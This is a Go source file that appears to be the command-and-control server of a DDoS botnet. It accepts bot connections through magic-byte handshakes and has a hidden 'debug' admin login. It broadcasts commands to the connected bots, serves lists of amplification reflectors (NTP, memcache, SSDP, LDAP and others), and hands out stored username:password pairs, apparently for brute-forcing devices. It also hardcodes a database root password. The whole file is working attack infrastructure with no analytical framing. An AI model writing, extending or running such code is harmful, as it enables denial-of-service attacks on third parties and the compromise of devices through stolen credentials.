package main

import
(
    "fmt"
    "net"
    //"errors"
    "time"
    "strings"
    "math/rand"
    "encoding/binary"
    "os"
    "bufio"
    "sync"
)

var cs *client = new_list()
var db *database = new_db("127.0.0.1:3306", "root", "Tsunami1337$#", "net")
const initial_string string = "debug"

type client struct {
    uid int
    count int
    clients map[int]*bot
    mutex *sync.RWMutex
}

var list_lookup = map[uint16]string {
    0: "lists/ntp.txt",
    1: "lists/memcache.txt",
    2: "lists/ssdp.txt",
    3: "lists/netbios.txt",
    4: "lists/portmap.txt",
    5: "lists/ldap.txt",
    6: "lists/mdns.txt",
}

func main() {
    db.flush_logged_in()

    cli, err := net.Listen("tcp", "0.0.0.0:7654")
    if err != nil {
        fmt.Println(err)
        return
    }
    
    f, err := net.Listen("tcp", "0.0.0.0:8989")
    if err != nil {
        fmt.Println(err)
        return
    }

    c, err := net.Listen("tcp", "0.0.0.0:7685")
    if err != nil {
        fmt.Println(err)
        return
    }

    // Run the reflector listener in a seperate go-routine
    go func() {
        for {
            conn, err := f.Accept()
            if err != nil {
                return
            }
            go reflection_handler(conn)
        }
    }()

    go func() {
        for {
            conn, err := c.Accept()
            if err != nil {
                return
            }
            go credential_handler(conn)
        }
    }()

    for {
        conn, err := cli.Accept()
        if err != nil {
            return
        }
        go initial_handler(conn)
    }
}
//209.236.72.34
//159.65.8.143
func read_client_data(buf []byte, le int) (bool, string) {
    if le != 46 {
        return false, ""
    }

    // Retrieve the packed bytes
    a := binary.BigEndian.Uint16(buf[:2])
    b := binary.BigEndian.Uint16(buf[2:])
    c := binary.BigEndian.Uint16(buf[4:])
    d := binary.BigEndian.Uint16(buf[6:])
    e := binary.BigEndian.Uint16(buf[8:])
    f := binary.BigEndian.Uint16(buf[10:])

    if a == 128 && b == 90 && c == 87 && d == 200 && e == 240 && f == 30 {
        return true, string("unknown")
    }

    return false, ""
}

func initial_handler(conn net.Conn) {
    defer conn.Close()

    conn.SetDeadline(time.Now().Add(30 * time.Second))
    buf := make([]byte, 46)
    
    for {
        le, err := conn.Read(buf)
        if err != nil || le <= 1 || le > 46 {
            return
        }
        if strings.Contains(string(buf), initial_string) {
            new_admin(conn).handle()
            continue
        }
        if buf[0] == 0x02 && buf[1] == 0x08 && buf[2] == 0x09 && buf[3] == 0x04 && buf[4] == 0x03 && buf[5] == 0x00 && le == 6 {
            new_bot(conn, "unknown").handle()
            continue
        }
        b, arch := read_client_data(buf, le)
        if b {
            new_bot(conn, arch).handle()
        }
    }
}

func reflection_handler(conn net.Conn) {
    defer conn.Close()

    read := make([]byte, 8)
    conn.SetReadDeadline(time.Now().Add(30 * time.Second))

    // Read the clients request for the reflector count and vector
    le, err := conn.Read(read)
    if err != nil || le < 1 {
        fmt.Println(err)
        return
    }

    vector := binary.BigEndian.Uint16(read[:2])
    count := binary.BigEndian.Uint32(read[4:])

    if count == 0 {
        fmt.Printf("Failed to parse the requested reflectors\n")
        return
    }

    fmt.Printf("Client requested %d reflectors!\n", count)

    list := list_lookup[vector]
    if list == "" {
        fmt.Printf("Failed to load list at index %d\n", vector)
        return
    }

    fmt.Printf("Opening %s\n", list)

    fd, err := os.Open(list)
    if err != nil {
        fmt.Println(err)
        return
    }

    defer fd.Close()

    var m map[uint32]string
    var idx uint32
    var s []string

    m = make(map[uint32]string)

    r := bufio.NewReader(fd)
    scan := bufio.NewScanner(r)
    for scan.Scan() {
        if idx == count {
            break
        }
        m[idx] = scan.Text()
        idx++
    }

    if idx < count {
        fmt.Printf("Reflector file does not contain enough reflectors to fulfil the clients needs\n")
        return
    }

    fmt.Printf("Loaded %d reflectors!\n", idx)

    s = make([]string, idx)

    for i := 0; i < int(idx); i++ {
        s[uint32(i)] = m[uint32(i)]
    }

    for l := range s {
        a := rand.Intn(l + 1)
        s[l], s[a] = s[a], s[l]
    }

    var m2 map[uint32]uint32
    var ii uint32

    m2 = make(map[uint32]uint32)

    for b := 0; b < int(count); b++ {
        p := net.ParseIP(s[b])
        if p == nil {
            fmt.Printf("Failed to parse reflector near %s\n", s[b])
            continue
        }
        m2[ii] = binary.BigEndian.Uint32(p[12:])
        ii++
    }

    buf := make([]byte, 0)

    for f := 0; f < int(ii); f++ {
        tmp := make([]byte, 4)
        binary.BigEndian.PutUint32(tmp, m2[uint32(f)])
        buf = append(buf, tmp...)
    }

    conn.SetWriteDeadline(time.Now().Add(30 * time.Second))

    le, err = conn.Write(buf)
    if err != nil || le <= 1 {
        fmt.Printf("Failed to write reflectors back to the client\n")
        return
    }

    fmt.Printf("Wrote %d bytes!\n", le)
    return
}

// Client handle code
func (this *client) view_count() int {
    return this.count
}

func (this *client) add_client(c *bot) {
    this.count++
    this.uid++
    c.uid = this.uid
    this.mutex.Lock()
    defer this.mutex.Unlock()
    this.clients[c.uid] = c
    fmt.Printf("Client connected - %s - %s\n", c.conn.RemoteAddr(), c.arch)

    return
}

func (this *client) delete_client(c *bot) {
    this.count -= 1
    this.mutex.Lock()
    defer this.mutex.Unlock()
    delete(this.clients, c.uid)
    fmt.Printf("Client disconnected - %s - %s\n", c.conn.RemoteAddr(), c.arch)
    return
}

func new_list() *client {
    c := &client{0, 0, make(map[int]*bot), &sync.RWMutex{}}
    return c
}

func (this *client) send_command(buf []byte, max_bots int) {
    count := 0
    this.mutex.RLock()
    defer this.mutex.RUnlock()
    for _, p := range this.clients {
        if max_bots != -1 && count > max_bots {
            break
        }
        p.conn.Write(buf)
        count++
    }
    return
}

func (this *client) view_statistics() map[string]int {
    this.mutex.Lock()
    defer this.mutex.Unlock()
    m := make(map[string]int)
    for _, p := range this.clients {
        m[p.arch]++
    }
    return m
}

func credential_handler(conn net.Conn) {
    defer conn.Close()
    
    readb := make([]byte, 2)
    li, err := conn.Read(readb)
    if err != nil || li <= 1 {
        return
    }

    c := binary.BigEndian.Uint16(readb[:2])

    if c > 50 {
        return
    }

    fmt.Printf("Client requested %d credentials - %s\n", c, conn.RemoteAddr())

    fd, err := os.Open("credentials.txt")
    if err != nil {
        return
    }
    
    defer fd.Close()
    
    var m map[int]string
    var idx int
    var s []string

    m = make(map[int]string)
    
    r := bufio.NewReader(fd)
    scan := bufio.NewScanner(r)
    
    for scan.Scan() {
        m[idx] = scan.Text()
        idx++
    }

    fmt.Printf("Loaded %d credentials!\n", idx)

    if int(c) > idx {
        fmt.Printf("Client requested too many credentials, not fulfilling request!\n")
        return
    }

    s = make([]string, idx)

    for i := 0; i < idx; i++ {
        s[i] = m[i]
    }
    
    // Shuffle the credentials
    for v := range s {
        a := rand.Intn(v + 1)
        s[v], s[a] = s[a], s[v]
    }

    buf := make([]byte, 0)
    var tmp []byte

    for q := 0; q < idx; q++ {
        sp := strings.Split(s[q], ":")
        for t := 0; t < 2; t++ {
            tmp = make([]byte, 1)
            str := []byte(sp[t])
            tmp[0] = uint8(len(sp[t]))
            tmp = append(tmp, str...)
            buf = append(buf, tmp...)
        }
    }

    conn.SetWriteDeadline(time.Now().Add(30 * time.Second))

    li, err = conn.Write(buf)
    if err != nil || li <= 1 {
        return
    }
    return
}
